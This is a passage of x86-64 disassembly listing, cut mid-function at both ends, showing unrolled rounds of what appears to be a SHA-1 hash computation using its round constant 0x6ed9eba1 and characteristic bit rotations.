  40488b:	48 c1 e0 05          	shl    $0x5,%rax
  40488f:	48 89 c2             	mov    %rax,%rdx
  404892:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  404899:	89 c0                	mov    %eax,%eax
  40489b:	48 c1 e8 1b          	shr    $0x1b,%rax
  40489f:	48 89 d1             	mov    %rdx,%rcx
  4048a2:	48 09 c1             	or     %rax,%rcx
  4048a5:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  4048ac:	48 8b 95 68 ff ff ff 	mov    -0x98(%rbp),%rdx
  4048b3:	48 31 d0             	xor    %rdx,%rax
  4048b6:	48 33 85 50 ff ff ff 	xor    -0xb0(%rbp),%rax
  4048bd:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  4048c1:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  4048c8:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  4048cc:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  4048d3:	89 c0                	mov    %eax,%eax
  4048d5:	48 c1 e8 1f          	shr    $0x1f,%rax
  4048d9:	48 09 c8             	or     %rcx,%rax
  4048dc:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
  4048e0:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
  4048e4:	48 01 c2             	add    %rax,%rdx
  4048e7:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  4048ee:	48 01 d0             	add    %rdx,%rax
  4048f1:	48 05 a1 eb d9 6e    	add    $0x6ed9eba1,%rax
  4048f7:	48 89 85 58 ff ff ff 	mov    %rax,-0xa8(%rbp)
  4048fe:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  404905:	48 c1 e0 1e          	shl    $0x1e,%rax
  404909:	48 89 c2             	mov    %rax,%rdx
  40490c:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  404913:	89 c0                	mov    %eax,%eax
  404915:	48 c1 e8 02          	shr    $0x2,%rax
  404919:	48 09 d0             	or     %rdx,%rax
  40491c:	48 89 85 68 ff ff ff 	mov    %rax,-0x98(%rbp)
  404923:	48 8b 55 d0          	mov    -0x30(%rbp),%rdx
  404927:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
  40492b:	48 31 c2             	xor    %rax,%rdx
  40492e:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  404932:	48 31 c2             	xor    %rax,%rdx
  404935:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  404939:	48 31 d0             	xor    %rdx,%rax
  40493c:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  404943:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  40494a:	48 c1 e0 05          	shl    $0x5,%rax
  40494e:	48 89 c2             	mov    %rax,%rdx
  404951:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  404958:	89 c0                	mov    %eax,%eax
  40495a:	48 c1 e8 1b          	shr    $0x1b,%rax
  40495e:	48 89 d1             	mov    %rdx,%rcx
  404961:	48 09 c1             	or     %rax,%rcx
  404964:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  40496b:	48 8b 95 60 ff ff ff 	mov    -0xa0(%rbp),%rdx
  404972:	48 31 d0             	xor    %rdx,%rax
  404975:	48 33 85 70 ff ff ff 	xor    -0x90(%rbp),%rax
  40497c:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  404980:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  404987:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  40498b:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  404992:	89 c0                	mov    %eax,%eax
  404994:	48 c1 e8 1f          	shr    $0x1f,%rax
  404998:	48 09 c8             	or     %rcx,%rax
  40499b:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
  40499f:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  4049a3:	48 01 c2             	add    %rax,%rdx
  4049a6:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  4049ad:	48 01 d0             	add    %rdx,%rax
  4049b0:	48 05 a1 eb d9 6e    	add    $0x6ed9eba1,%rax
  4049b6:	48 89 85 50 ff ff ff 	mov    %rax,-0xb0(%rbp)
  4049bd:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  4049c4:	48 c1 e0 1e          	shl    $0x1e,%rax
  4049c8:	48 89 c2             	mov    %rax,%rdx
  4049cb:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  4049d2:	89 c0                	mov    %eax,%eax
  4049d4:	48 c1 e8 02          	shr    $0x2,%rax
  4049d8:	48 09 d0             	or     %rdx,%rax
  4049db:	48 89 85 60 ff ff ff 	mov    %rax,-0xa0(%rbp)
  4049e2:	48 8b 55 d8          	mov    -0x28(%rbp),%rdx
  4049e6:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
  4049ea:	48 31 c2             	xor    %rax,%rdx
  4049ed:	48 8b 45 80          	mov    -0x80(%rbp),%rax
  4049f1:	48 31 c2             	xor    %rax,%rdx
  4049f4:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  4049f8:	48 31 d0             	xor    %rdx,%rax
  4049fb:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  404a02:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  404a09:	48 c1 e0 05          	shl    $0x5,%rax
  404a0d:	48 89 c2             	mov    %rax,%rdx
  404a10:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  404a17:	89 c0                	mov    %eax,%eax
  404a19:	48 c1 e8 1b          	shr    $0x1b,%rax
  404a1d:	48 89 d1             	mov    %rdx,%rcx
  404a20:	48 09 c1             	or     %rax,%rcx
  404a23:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  404a2a:	48 8b 95 58 ff ff ff 	mov    -0xa8(%rbp),%rdx
  404a31:	48 31 d0             	xor    %rdx,%rax
  404a34:	48 33 85 68 ff ff ff 	xor    -0x98(%rbp),%rax
  404a3b:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  404a3f:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  404a46:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  404a4a:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  404a51:	89 c0                	mov    %eax,%eax
  404a53:	48 c1 e8 1f          	shr    $0x1f,%rax
  404a57:	48 09 c8             	or     %rcx,%rax
  404a5a:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
  404a5e:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  404a62:	48 01 c2             	add    %rax,%rdx
  404a65:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  404a6c:	48 01 d0             	add    %rdx,%rax
  404a6f:	48 05 a1 eb d9 6e    	add    $0x6ed9eba1,%rax
  404a75:	48 89 85 70 ff ff ff 	mov    %rax,-0x90(%rbp)
  404a7c:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  404a83:	48 c1 e0 1e          	shl    $0x1e,%rax
  404a87:	48 89 c2             	mov    %rax,%rdx
  404a8a:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  404a91:	89 c0                	mov    %eax,%eax
  404a93:	48 c1 e8 02          	shr    $0x2,%rax
  404a97:	48 09 d0             	or     %rdx,%rax
  404a9a:	48 89 85 58 ff ff ff 	mov    %rax,-0xa8(%rbp)
  404aa1:	48 8b 55 e0          	mov    -0x20(%rbp),%rdx
  404aa5:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
  404aa9:	48 31 c2             	xor    %rax,%rdx
  404aac:	48 8b 45 88          	mov    -0x78(%rbp),%rax
  404ab0:	48 31 c2             	xor    %rax,%rdx
  404ab3:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  404ab7:	48 31 d0             	xor    %rdx,%rax
  404aba:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  404ac1:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  404ac8:	48 c1 e0 05          	shl    $0x5,%rax
  404acc:	48 89 c2             	mov    %rax,%rdx
  404acf:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  404ad6:	89 c0                	mov    %eax,%eax
  404ad8:	48 c1 e8 1b          	shr    $0x1b,%rax
  404adc:	48 89 d1             	mov    %rdx,%rcx
  404adf:	48 09 c1             	or     %rax,%rcx
  404ae2:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  404ae9:	48 8b 95 50 ff ff ff 	mov    -0xb0(%rbp),%rdx
  404af0:	48 31 d0             	xor    %rdx,%rax
  404af3:	48 33 85 60 ff ff ff 	xor    -0xa0(%rbp),%rax
  404afa:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  404afe:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  404b05:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  404b09:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  404b10:	89 c0                	mov    %eax,%eax
  404b12:	48 c1 e8 1f          	shr    $0x1f,%rax
  404b16:	48 09 c8             	or     %rcx,%rax
  404b19:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  404b1d:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  404b21:	48 01 c2             	add    %rax,%rdx
  404b24:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  404b2b:	48 01 d0             	add    %rdx,%rax
  404b2e:	48 05 a1 eb d9 6e    	add    $0x6ed9eba1,%rax
  404b34:	48 89 85 68 ff ff ff 	mov    %rax,-0x98(%rbp)
  404b3b:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  404b42:	48 c1 e0 1e          	shl    $0x1e,%rax
  404b46:	48 89 c2             	mov    %rax,%rdx
  404b49:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  404b50:	89 c0                	mov    %eax,%eax
  404b52:	48 c1 e8 02          	shr    $0x2,%rax
  404b56:	48 09 d0             	or     %rdx,%rax
  404b59:	48 89 85 50 ff ff ff 	mov    %rax,-0xb0(%rbp)
  404b60:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
  404b64:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
  404b68:	48 31 c2             	xor    %rax,%rdx
  404b6b:	48 8b 45 90          	mov    -0x70(%rbp),%rax
  404b6f:	48 31 c2             	xor    %rax,%rdx
  404b72:	48 8b 45 80          	mov    -0x80(%rbp),%rax
  404b76:	48 31 d0             	xor    %rdx,%rax
  404b79:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  404b80:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  404b87:	48 c1 e0 05          	shl    $0x5,%rax
  404b8b:	48 89 c2             	mov    %rax,%rdx
  404b8e:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  404b95:	89 c0                	mov    %eax,%eax
  404b97:	48 c1 e8 1b          	shr    $0x1b,%rax
  404b9b:	48 89 d1             	mov    %rdx,%rcx
  404b9e:	48 09 c1             	or     %rax,%rcx
  404ba1:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  404ba8:	48 8b 95 70 ff ff ff 	mov    -0x90(%rbp),%rdx
  404baf:	48 31 d0             	xor    %rdx,%rax
  404bb2:	48 33 85 58 ff ff ff 	xor    -0xa8(%rbp),%rax
  404bb9:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  404bbd:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  404bc4:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  404bc8:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  404bcf:	89 c0                	mov    %eax,%eax
  404bd1:	48 c1 e8 1f          	shr    $0x1f,%rax
  404bd5:	48 09 c8             	or     %rcx,%rax
  404bd8:	48 89 45 80          	mov    %rax,-0x80(%rbp)
  404bdc:	48 8b 45 80          	mov    -0x80(%rbp),%rax
  404be0:	48 01 c2             	add    %rax,%rdx
  404be3:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  404bea:	48 01 d0             	add    %rdx,%rax
  404bed:	48 05 a1 eb d9 6e    	add    $0x6ed9eba1,%rax
  404bf3:	48 89 85 60 ff ff ff 	mov    %rax,-0xa0(%rbp)
  404bfa:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  404c01:	48 c1 e0 1e          	shl    $0x1e,%rax
  404c05:	48 89 c2             	mov    %rax,%rdx
  404c08:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  404c0f:	89 c0                	mov    %eax,%eax
  404c11:	48 c1 e8 02          	shr    $0x2,%rax
  404c15:	48 09 d0             	or     %rdx,%rax
  404c18:	48 89 85 70 ff ff ff 	mov    %rax,-0x90(%rbp)
  404c1f:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
  404c23:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  404c27:	48 31 c2             	xor    %rax,%rdx
  404c2a:	48 8b 45 98          	mov    -0x68(%rbp),%rax
  404c2e:	48 31 c2             	xor    %rax,%rdx
  404c31:	48 8b 45 88          	mov    -0x78(%rbp),%rax
  404c35:	48 31 d0             	xor    %rdx,%rax
  404c38:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  404c3f:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  404c46:	48 c1 e0 05          	shl    $0x5,%rax
  404c4a:	48 89 c2             	mov    %rax,%rdx
  404c4d:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  404c54:	89 c0                	mov    %eax,%eax
  404c56:	48 c1 e8 1b          	shr    $0x1b,%rax
  404c5a:	48 89 d1             	mov    %rdx,%rcx
  404c5d:	48 09 c1             	or     %rax,%rcx
  404c60:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  404c67:	48 8b 95 68 ff ff ff 	mov    -0x98(%rbp),%rdx
  404c6e:	48 31 d0             	xor    %rdx,%rax
  404c71:	48 33 85 50 ff ff ff 	xor    -0xb0(%rbp),%rax
  404c78:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  404c7c:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  404c83:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  404c87:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  404c8e:	89 c0                	mov    %eax,%eax
  404c90:	48 c1 e8 1f          	shr    $0x1f,%rax
  404c94:	48 09 c8             	or     %rcx,%rax
  404c97:	48 89 45 88          	mov    %rax,-0x78(%rbp)
  404c9b:	48 8b 45 88          	mov    -0x78(%rbp),%rax
  404c9f:	48 01 c2             	add    %rax,%rdx
  404ca2:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  404ca9:	48 01 d0             	add    %rdx,%rax
  404cac:	48 05 a1 eb d9 6e    	add    $0x6ed9eba1,%rax
  404cb2:	48 89 85 58 ff ff ff 	mov    %rax,-0xa8(%rbp)
  404cb9:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  404cc0:	48 c1 e0 1e          	shl    $0x1e,%rax
  404cc4:	48 89 c2             	mov    %rax,%rdx
  404cc7:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  404cce:	89 c0                	mov    %eax,%eax
  404cd0:	48 c1 e8 02          	shr    $0x2,%rax
  404cd4:	48 09 d0             	or     %rdx,%rax
  404cd7:	48 89 85 68 ff ff ff 	mov    %rax,-0x98(%rbp)
  404cde:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
  404ce2:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
  404ce6:	48 31 c2             	xor    %rax,%rdx
  404ce9:	48 8b 45 a0          	mov    -0x60(%rbp),%rax
  404ced:	48 31 c2             	xor    %rax,%rdx
  404cf0:	48 8b 45 90          	mov    -0x70(%rbp),%rax
  404cf4:	48 31 d0             	xor    %rdx,%rax
  404cf7:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  404cfe:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  404d05:	48 c1 e0 05          	shl    $0x5,%rax
  404d09:	48 89 c2             	mov    %rax,%rdx
  404d0c:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  404d13:	89 c0                	mov    %eax,%eax
  404d15:	48 c1 e8 1b          	shr    $0x1b,%rax
  404d19:	48 89 d1             	mov    %rdx,%rcx
  404d1c:	48 09 c1             	or     %rax,%rcx
  404d1f:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  404d26:	48 8b 95 60 ff ff ff 	mov    -0xa0(%rbp),%rdx
  404d2d:	48 31 d0             	xor    %rdx,%rax
  404d30:	48 33 85 70 ff ff ff 	xor    -0x90(%rbp),%rax
  404d37:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  404d3b:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  404d42:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  404d46:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  404d4d:	89 c0                	mov    %eax,%eax
  404d4f:	48 c1 e8 1f          	shr    $0x1f,%rax
  404d53:	48 09 c8             	or     %rcx,%rax
  404d56:	48 89 45 90          	mov    %rax,-0x70(%rbp)
  404d5a:	48 8b 45 90          	mov    -0x70(%rbp),%rax
  404d5e:	48 01 c2             	add    %rax,%rdx
  404d61:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  404d68:	48 01 d0             	add    %rdx,%rax
  404d6b:	48 05 a1 eb d9 6e    	add    $0x6ed9eba1,%rax
  404d71:	48 89 85 50 ff ff ff 	mov    %rax,-0xb0(%rbp)
  404d78:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  404d7f:	48 c1 e0 1e          	shl    $0x1e,%rax
  404d83:	48 89 c2             	mov    %rax,%rdx
  404d86:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  404d8d:	89 c0                	mov    %eax,%eax
  404d8f:	48 c1 e8 02          	shr    $0x2,%rax
  404d93:	48 09 d0             	or     %rdx,%rax
  404d96:	48 89 85 60 ff ff ff 	mov    %rax,-0xa0(%rbp)
  404d9d:	48 8b 55 80          	mov    -0x80(%rbp),%rdx
  404da1:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  404da5:	48 31 c2             	xor    %rax,%rdx
  404da8:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
  404dac:	48 31 c2             	xor    %rax,%rdx
  404daf:	48 8b 45 98          	mov    -0x68(%rbp),%rax
  404db3:	48 31 d0             	xor    %rdx,%rax
  404db6:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  404dbd:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  404dc4:	48 c1 e0 05          	shl    $0x5,%rax
  404dc8:	48 89 c2             	mov    %rax,%rdx
  404dcb:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  404dd2:	89 c0                	mov    %eax,%eax
  404dd4:	48 c1 e8 1b          	shr    $0x1b,%rax
  404dd8:	48 89 d1             	mov    %rdx,%rcx
  404ddb:	48 09 c1             	or     %rax,%rcx
  404dde:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  404de5:	48 8b 95 58 ff ff ff 	mov    -0xa8(%rbp),%rdx
  404dec:	48 31 d0             	xor    %rdx,%rax
  404def:	48 33 85 68 ff ff ff 	xor    -0x98(%rbp),%rax
  404df6:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  404dfa:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  404e01:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  404e05:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  404e0c:	89 c0                	mov    %eax,%eax
  404e0e:	48 c1 e8 1f          	shr    $0x1f,%rax
  404e12:	48 09 c8             	or     %rcx,%rax
  404e15:	48 89 45 98          	mov    %rax,-0x68(%rbp)
  404e19:	48 8b 45 98          	mov    -0x68(%rbp),%rax
  404e1d:	48 01 c2             	add    %rax,%rdx
  404e20:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  404e27:	48 01 d0             	add    %rdx,%rax
  404e2a:	48 05 a1 eb d9 6e    	add    $0x6ed9eba1,%rax
  404e30:	48 89 85 70 ff ff ff 	mov    %rax,-0x90(%rbp)
  404e37:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  404e3e:	48 c1 e0 1e          	shl    $0x1e,%rax
  404e42:	48 89 c2             	mov    %rax,%rdx
  404e45:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  404e4c:	89 c0                	mov    %eax,%eax
  404e4e:	48 c1 e8 02          	shr    $0x2,%rax
  404e52:	48 09 d0             	or     %rdx,%rax
  404e55:	48 89 85 58 ff ff ff 	mov    %rax,-0xa8(%rbp)
  404e5c:	48 8b 55 88          	mov    -0x78(%rbp),%rdx
  404e60:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
  404e64:	48 31 c2             	xor    %rax,%rdx
  404e67:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
  404e6b:	48 31 c2             	xor    %rax,%rdx
  404e6e:	48 8b 45 a0          	mov    -0x60(%rbp),%rax
  404e72:	48 31 d0             	xor    %rdx,%rax
  404e75:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  404e7c:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  404e83:	48 c1 e0 05          	shl    $0x5,%rax
  404e87:	48 89 c2             	mov    %rax,%rdx
  404e8a:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  404e91:	89 c0                	mov    %eax,%eax
  404e93:	48 c1 e8 1b          	shr    $0x1b,%rax
  404e97:	48 89 d1             	mov    %rdx,%rcx
  404e9a:	48 09 c1             	or     %rax,%rcx
  404e9d:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  404ea4:	48 8b 95 50 ff ff ff 	mov    -0xb0(%rbp),%rdx
  404eab:	48 31 d0             	xor    %rdx,%rax
  404eae:	48 33 85 60 ff ff ff 	xor    -0xa0(%rbp),%rax
  404eb5:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  404eb9:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  404ec0:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  404ec4:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  404ecb:	89 c0                	mov    %eax,%eax
  404ecd:	48 c1 e8 1f          	shr    $0x1f,%rax
  404ed1:	48 09 c8             	or     %rcx,%rax
  404ed4:	48 89 45 a0          	mov    %rax,-0x60(%rbp)
  404ed8:	48 8b 45 a0          	mov    -0x60(%rbp),%rax
  404edc:	48 01 c2             	add    %rax,%rdx
  404edf:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  404ee6:	48 01 d0             	add    %rdx,%rax
  404ee9:	48 05 a1 eb d9 6e    	add    $0x6ed9eba1,%rax
  404eef:	48 89 85 68 ff ff ff 	mov    %rax,-0x98(%rbp)
  404ef6:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  404efd:	48 c1 e0 1e          	shl    $0x1e,%rax
  404f01:	48 89 c2             	mov    %rax,%rdx
  404f04:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  404f0b:	89 c0                	mov    %eax,%eax
  404f0d:	48 c1 e8 02          	shr    $0x2,%rax
  404f11:	48 09 d0             	or     %rdx,%rax
  404f14:	48 89 85 50 ff ff ff 	mov    %rax,-0xb0(%rbp)
  404f1b:	48 8b 55 90          	mov    -0x70(%rbp),%rdx
  404f1f:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  404f23:	48 31 c2             	xor    %rax,%rdx
  404f26:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
  404f2a:	48 31 c2             	xor    %rax,%rdx
  404f2d:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
  404f31:	48 31 d0             	xor    %rdx,%rax
  404f34:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  404f3b:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  404f42:	48 c1 e0 05          	shl    $0x5,%rax
  404f46:	48 89 c2             	mov    %rax,%rdx
  404f49:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  404f50:	89 c0                	mov    %eax,%eax
  404f52:	48 c1 e8 1b          	shr    $0x1b,%rax
  404f56:	48 89 d1             	mov    %rdx,%rcx
  404f59:	48 09 c1             	or     %rax,%rcx
  404f5c:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  404f63:	48 8b 95 70 ff ff ff 	mov    -0x90(%rbp),%rdx
  404f6a:	48 31 d0             	xor    %rdx,%rax
  404f6d:	48 33 85 58 ff ff ff 	xor    -0xa8(%rbp),%rax
  404f74:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  404f78:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  404f7f:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  404f83:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  404f8a:	89 c0                	mov    %eax,%eax
  404f8c:	48 c1 e8 1f          	shr    $0x1f,%rax
  404f90:	48 09 c8             	or     %rcx,%rax
  404f93:	48 89 45 a8          	mov    %rax,-0x58(%rbp)
  404f97:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
  404f9b:	48 01 c2             	add    %rax,%rdx
  404f9e:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  404fa5:	48 01 d0             	add    %rdx,%rax
  404fa8:	48 05 a1 eb d9 6e    	add    $0x6ed9eba1,%rax
  404fae:	48 89 85 60 ff ff ff 	mov    %rax,-0xa0(%rbp)
  404fb5:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  404fbc:	48 c1 e0 1e          	shl    $0x1e,%rax
  404fc0:	48 89 c2             	mov    %rax,%rdx
  404fc3:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  404fca:	89 c0                	mov    %eax,%eax
  404fcc:	48 c1 e8 02          	shr    $0x2,%rax
  404fd0:	48 09 d0             	or     %rdx,%rax
  404fd3:	48 89 85 70 ff ff ff 	mov    %rax,-0x90(%rbp)
  404fda:	48 8b 55 98          	mov    -0x68(%rbp),%rdx
  404fde:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  404fe2:	48 31 c2             	xor    %rax,%rdx
  404fe5:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
  404fe9:	48 31 c2             	xor    %rax,%rdx
  404fec:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
  404ff0:	48 31 d0             	xor    %rdx,%rax
  404ff3:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  404ffa:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  405001:	48 c1 e0 05          	shl    $0x5,%rax
  405005:	48 89 c2             	mov    %rax,%rdx
  405008:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  40500f:	89 c0                	mov    %eax,%eax
  405011:	48 c1 e8 1b          	shr    $0x1b,%rax
  405015:	48 89 d1             	mov    %rdx,%rcx
  405018:	48 09 c1             	or     %rax,%rcx
  40501b:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  405022:	48 8b 95 68 ff ff ff 	mov    -0x98(%rbp),%rdx
  405029:	48 31 d0             	xor    %rdx,%rax
  40502c:	48 33 85 50 ff ff ff 	xor    -0xb0(%rbp),%rax
  405033:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  405037:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  40503e:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  405042:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  405049:	89 c0                	mov    %eax,%eax
  40504b:	48 c1 e8 1f          	shr    $0x1f,%rax
  40504f:	48 09 c8             	or     %rcx,%rax
  405052:	48 89 45 b0          	mov    %rax,-0x50(%rbp)
  405056:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
  40505a:	48 01 c2             	add    %rax,%rdx
  40505d:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  405064:	48 01 d0             	add    %rdx,%rax
  405067:	48 05 a1 eb d9 6e    	add    $0x6ed9eba1,%rax
  40506d:	48 89 85 58 ff ff ff 	mov    %rax,-0xa8(%rbp)
  405074:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  40507b:	48 c1 e0 1e          	shl    $0x1e,%rax
  40507f:	48 89 c2             	mov    %rax,%rdx
  405082:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  405089:	89 c0                	mov    %eax,%eax
  40508b:	48 c1 e8 02          	shr    $0x2,%rax
  40508f:	48 09 d0             	or     %rdx,%rax
  405092:	48 89 85 68 ff ff ff 	mov    %rax,-0x98(%rbp)
  405099:	48 8b 55 a0          	mov    -0x60(%rbp),%rdx
  40509d:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
